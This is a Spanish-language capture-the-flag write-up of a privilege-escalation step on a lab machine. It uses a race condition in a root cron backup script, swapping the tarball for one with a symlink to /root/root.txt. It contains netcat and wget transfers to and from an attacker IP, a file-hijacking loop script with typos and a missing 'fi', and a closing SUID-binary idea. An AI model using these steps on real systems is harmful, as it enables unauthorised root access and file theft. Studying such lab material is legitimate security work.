## Escalada de privilegios {-}

### Rootear la maquina {-}

```bash
cd /root
id
sudo -l
```

Aqui vemos que no podemos hacer nada y que no tenemos posiblidad de rootear la maquina por vulnerabilidades del propio usuario.
Tenemos que enumerar el sistema.

```bash
uname -a
lsb_release -a
cd /
find \-perm -4000 2>/dev/null
cat /etc/cron
crontab -l
ls /var/spool/cron/
ls /var/spool/cron/ -l
```

Bueno aqui no se ve nada, no tenemos permisos SUID no hay nada vemos tareas cron. Pero siempre se puede ver de forma alternativa si hay tareas 
que se ejecutan a intervalo regular de tiempo.

```bash
cd /dev/shm
touch procmon.sh
chmod +x procmon.sh
nano procmon.sh
```

Aqui nos creamos el script que nos servira de monitoreo de procesos.

```bash
#!/bin/bash

old_process=$(ps -eo command)

while true; do
    new_process=$(ps -eo command)
    diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "procmon|command"
    old_process=$new_process
done
```

Ya podemos ver que hay una tarea `/bin/bash /usr/sbin/backuperer` que se ejecuta a intervalos regulares de tiempo. lo Analizamos.

```bash
cat /usr/sbin/backuperer
```

Aqui vemos un script que:

1. supprime ficheros `/var/tmp/.*` 
1. supprime el directorio `/var/tmp/check`
1. comprime todo lo que hay en `/var/www/html` como un fichero `/var/tmp/.<hash>`
1. sleep 30
1. crea un directorio `/var/tmp/check`
1. descomprime `/var/tmp/.<hash>` en `/var/tmp/check`
1. controla si hay una differencia entre el contenido del hash y `/var/www/html`
1. si hay differencias, reporta los cambios en el fichero `/var/backup/onuma_backup_error.txt`

La vulnerabilidad de este script reside en el sleep de 30 secundos que nos permitiria borrar el fichero comprimido `.<hash>` y meter
otro comprimido. Como suponemos que es **root** que ejecuta la tarea, podemos aprovechar de esto para ver la flag de root.

#### Modificacion del comprimido {-}

1. Creamos un comprimido de `/var/www/html`

    ```bash
    cd /dev/shm
    tar -zcvf comprimido.tar /var/www/html
    ```

1. Preparamos en la maquina de atacante para recibir el comprimido

    ```bash
    nc -nlvp 443 > comprimido.tar
    ```

1. Enviamos el comprimido desde la maquina victima

    ```bash
    nc 10.10.14.8 443 < comprimido.tar
    ```

Ahora que tenemos el comprimido en la maquina de atacante, vamos a cambiar su contenido

1. descomprimimos el ficher `.tar`

    ```bash
    tar -xf comprimido.tar
    ```

1. Modificamos el ficher `index.html`

    ```bash
    cd var/www/html
    rm index.html
    ln -s -f /root/root.txt index.html
    ```

1. creamos un nuevo comprimido

    ```bash
    cd ../../..
    tar -zcvf comprimido.tar var/www/html
    ```

1. enviamos el comprimido a la maquina victima

    - en la maquina de atacante

        ```bash
        python3 -m http.server 80
        ```

    - en la maquina victima

        ```bash
        wget http://10.10.14.8/comprimido.tar
        ```

1. creamos un script para ejecutar el secuestro

    ```bash
    touch tehijackeolavida.sh
    chmod +x tehijackeolavida.sh
    nano tehijackeolavida.sh
    ```

    que contiene

    ```bash
    #!/bin/bash

    while true; do
        filename=$(ls -ls /var/tmp/ | awk 'NF{print $NF}' | grep -oP '^\..*[a-f0-9]')

        if [ $filename ]; then
            ehco -e "\n[+] El nombre de archivo es $filename\n"
            rm /var/tmp/$filename
            cp comprimido.tar /var/tmp/$filename
            echo -e "\n[+] Archivo hijiackeado con exito\n"
            exit 0
    done
    ```

1. Ejecutamos el script 

    ```bash
    ./tehijackeolavida.sh
    ```

Cuando la pantalla nos muestre el mensaje `[+] Archivo hijackeado con exito`, podemos mirar el fichero `/var/backup/onuma_backup_error.txt` 
y 30 segundos mas tarde tendriamos que ver la flag.

```bash
while true; do cat /var/backup/onuma_backup_error.txt ; sleep 1; clear; done
```

Ya podemos ver la flag.

### Rootear la maquina de verdad {-}

Podríamos crear un binario en C con SUID para que lo deposite root en html, lo que nos permitiria rootear la maquina.